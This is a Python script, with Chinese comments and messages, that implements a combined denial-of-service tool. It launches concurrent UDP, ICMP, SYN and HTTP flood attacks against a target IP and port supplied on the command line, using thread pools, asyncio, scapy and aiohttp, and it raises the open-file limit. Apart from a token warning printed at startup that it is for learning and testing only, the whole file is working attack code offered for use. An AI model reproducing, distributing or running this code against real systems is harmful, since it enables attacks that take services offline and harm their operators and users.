import time
import socket
import random
import argparse
import sys
import asyncio
import aiohttp
from scapy.all import IP, TCP, ICMP, send
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# 全局配置
MAX_WORKERS = 1000  # 最大并发工作线程数
CONNECTION_TIMEOUT = 5  # 连接超时时间


async def udp_flood_async(ip, port, speed, count):
    """高并发UDP洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for _ in range(count):
            task = loop.run_in_executor(
                executor,
                udp_flood_worker,
                ip, port, speed
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def udp_flood_worker(ip, port, speed):
    """UDP攻击工作线程"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(CONNECTION_TIMEOUT)
        data = random._urandom(1490)
        while True:
            sock.sendto(data, (ip, port))
            time.sleep((1000 - speed) / 2000)
    except:
        pass


async def icmp_flood_async(ip, speed, count):
    """高并发ICMP洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for _ in range(count):
            task = loop.run_in_executor(
                executor,
                icmp_flood_worker,
                ip, speed
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def icmp_flood_worker(ip, speed):
    """ICMP攻击工作线程"""
    try:
        while True:
            send(IP(dst=ip) / ICMP(), verbose=0)
            time.sleep((1000 - speed) / 3000)
    except:
        pass


async def syn_flood_async(ip, port, speed, count):
    """高并发SYN洪水攻击"""
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        tasks = []
        for _ in range(count):
            task = loop.run_in_executor(
                executor,
                syn_flood_worker,
                ip, port, speed
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


def syn_flood_worker(ip, port, speed):
    """SYN攻击工作线程"""
    try:
        while True:
            send(IP(dst=ip) / TCP(dport=port, flags="S"), verbose=0)
            time.sleep((1000 - speed) / 2500)
    except:
        pass


async def http_flood_async(ip, port, speed, count):
    """高并发HTTP洪水攻击"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    ]

    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(count):
            task = asyncio.create_task(
                http_flood_worker(session, ip, port, headers, speed)
            )
            tasks.append(task)
        await asyncio.gather(*tasks)


async def http_flood_worker(session, ip, port, headers, speed):
    """HTTP攻击工作协程"""
    url = f"http://{ip}:{port}/"
    while True:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                # 不读取响应内容，仅建立连接
                pass
        except:
            pass
        await asyncio.sleep((1000 - speed) / 1000)


async def main():
    print("高并发版多层混合攻击启动！⚡")
    print("警告：使用此脚本可能导致法律问题，仅供学习测试！")

    parser = argparse.ArgumentParser(description="高并发四合一攻击脚本")
    parser.add_argument("-ip", required=True, help="目标IP")
    parser.add_argument("-port", type=int, default=80, help="目标端口")
    parser.add_argument("-speed", type=int, default=500, help="攻击速度 (1-1000)")
    parser.add_argument("-concurrency", type=int, default=100, help="并发连接数")

    args = parser.parse_args()

    # 启动所有攻击任务
    tasks = []

    print(f"[+] 启动UDP洪水攻击 ({args.concurrency}并发)...")
    tasks.append(asyncio.create_task(
        udp_flood_async(args.ip, args.port, args.speed, args.concurrency)
    ))

    print(f"[+] 启动ICMP死亡Ping ({args.concurrency}并发)...")
    tasks.append(asyncio.create_task(
        icmp_flood_async(args.ip, args.speed, args.concurrency)
    ))

    print(f"[+] 启动SYN洪水攻击 ({args.concurrency}并发)...")
    tasks.append(asyncio.create_task(
        syn_flood_async(args.ip, args.port, args.speed, args.concurrency)
    ))

    print(f"[+] 启动HTTP洪水攻击 ({args.concurrency}并发)...")
    tasks.append(asyncio.create_task(
        http_flood_async(args.ip, args.port, args.speed, args.concurrency)
    ))

    print("所有攻击已启动！按Ctrl+C停止")

    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        print("攻击停止！")
    except KeyboardInterrupt:
        print("攻击停止！")


if __name__ == "__main__":
    # 设置更高的资源限制
    import resource

    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (10000, 10000))
    except:
        pass

    # 启动事件循环
    asyncio.run(main())